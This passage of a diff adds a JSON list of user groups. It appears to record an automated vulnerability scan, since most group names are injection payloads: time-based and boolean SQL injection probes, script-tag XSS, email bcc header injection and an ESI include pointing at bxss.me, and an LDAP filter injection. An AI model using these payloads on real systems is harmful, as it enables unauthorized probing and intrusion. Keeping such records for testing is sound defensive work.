+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND (select count(*) from INFORMATION_SCHEMA.SYSTEM_TABLES)> 0 OR '4'='0",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND (select count(*) from Information_schema.tables)> 0 OR '4'='0",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND (select count(*) from java.lang.Object o)> 0 OR '4'='0",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND (select count(*) from M_DATABASE)> 0 OR '4'='0",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND (select count(*) from pg_tables)> 0 OR '4'='0",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND (select count(*) from sqlite_master) > 0 OR '4'='0",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND (select count(*) from sys.objects)> 0 OR '4'='0",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND (select count(*) from syscat.tables)> 0 OR '4'='0",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND (select count(*) from systables)> 0 OR '4'='0",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND (select count(*) from SYSTEM_TABLES)> 0 OR '4'='0",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND (select count(*) from tab)> 0 OR '4'='0",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' and 1 = if(5=0, sleep(2), 0) and '1'='1",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' and 1 = if(5=5, sleep(2), 0) and '1'='1",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' and 1 in (case when 1=0 then (sysmaster:yieldn(2)) else 2 end) and '1'='1",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' and 1 in (case when 1=1 then (sysmaster:yieldn(2)) else 2 end) and '1'='1",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' and 1=(case 'a' when 'a' then pg_sleep(2) else '0' end) and '1'='1",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' and 1=(case 'b' when 'a' then pg_sleep(2) else '0' end) and '1'='1",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' and 1=if(5=0, benchmark(1500000, md5(1)), 0) and '1'='1",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' and 1=if(5=5, benchmark(1500000, md5(1)), 0) and '1'='1",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND 2*3*8=6*8 AND '919X'='919X",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND 2*3*8=6*8 AND 'GXRn'='GXRn",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND 5=0 OR 's'='0",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' AND 5=5 OR 's'='0",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' OR",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup' or ''='",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup'\"()&%<zzz><ScRiPt >7SuT(9651)</ScRiPt>",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup'\"()&%<zzz><ScRiPt >h2YQ(9422)</ScRiPt>",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup'&&sleep(27*1000)*npndmu&&'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup'&&sleep(27*1000)*ugmwuc&&'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup'||'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup'||''||'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup'|||'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup'||sleep(27*1000)*jvxdek||'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup'||sleep(27*1000)*tyewku||'",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup\" AND 2*3*8=6*8 AND \"5LSP\"=\"5LSP",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup\" AND 2*3*8=6*8 AND \"SKWp\"=\"SKWp",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup\"&&sleep(27*1000)*gaeqhd&&\"",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup\"&&sleep(27*1000)*yznamb&&\"",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup\"||sleep(27*1000)*trmhlu||\"",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup\"||sleep(27*1000)*zcbgnf||\"",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup&n918756=v924278",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup&n985891=v976190",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup%' AND 2*3*8=6*8 AND 'THMi'!='THMi%",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup%' AND 2*3*8=6*8 AND 'uv7i'!='uv7i%",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup%0abcc:009247.7-1863.7.8444a.19201.2@bxss.me",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup%0abcc:009247.8-1493.8.d7d4c.19201.2@bxss.me",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup<esi:include src=\"http://bxss.me/rpb.png\"/>",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9 or 1 < (select case when 1=0 then upper(hex(randomblob(300000000))) else 0 end)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9 or 1 < (select case when 1=1 then upper(hex(randomblob(300000000))) else 0 end)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9 or 1 = if(5=0, sleep(2), 0)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9 or 1 = if(5=5, sleep(2), 0)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9 or 1 in (case when 1=0 then (sysmaster:yieldn(2)) else 2 end)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9 or 1 in (case when 1=1 then (sysmaster:yieldn(2)) else 2 end)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9 or 1=(case 'a' when 'a' then pg_sleep(2) else '0' end)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9 or 1=(case 'b' when 'b' then pg_sleep(2) else '0' end)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9 or 1=if(5=0, benchmark(1500000, md5(1)), 0)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9 or 1=if(5=5, benchmark(1500000, md5(1)), 0)",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9' or (1 < (select case when 1=0 then upper(hex(randomblob(300000000))) else 0 end)) OR '1'='2",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9' or (1 < (select case when 1=1 then upper(hex(randomblob(300000000))) else 0 end)) OR '1'='2",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9' or 1 = if(5=0, sleep(2), 0) OR '1'='2",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9' or 1 = if(5=5, sleep(2), 0) OR '1'='2",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9' or 1 in (case when 1=0 then (sysmaster:yieldn(2)) else 2 end) OR '1'='2",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9' or 1 in (case when 1=1 then (sysmaster:yieldn(2)) else 2 end) OR '1'='2",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9' or 1=(case 'a' when 'a' then pg_sleep(2) else '0' end) OR '1'='2",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9' or 1=(case 'b' when 'a' then pg_sleep(2) else '0' end) OR '1'='2",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9' or 1=if(5=0, benchmark(1500000, md5(1)), 0) OR '1'='2",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9' or 1=if(5=5, benchmark(1500000, md5(1)), 0) OR '1'='2",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9012256",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "TestGroup9266698",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "to@example.com>%0d%0abcc:009247.7-1864.7.8444a.19201.2@bxss.me",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "to@example.com>%0d%0abcc:009247.8-1494.8.d7d4c.19201.2@bxss.me",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "UFBHU8LN' OR 786=(SELECT 786 FROM PG_SLEEP(15))--",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "void1939774314)(uid=1939774314void",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "vtB76Rty'; waitfor delay '0:0:15' -- ",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "wkaLRB5X') OR 600=(SELECT 600 FROM PG_SLEEP(15))--",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        },
+        {
+            "name": "Y0Z2bkJwYmhv",
+            "user_list": [],
+            "permission_list": [
+                {
+                    "name": "Full Access"
+                }
+            ]
+        }
+    ]
+}
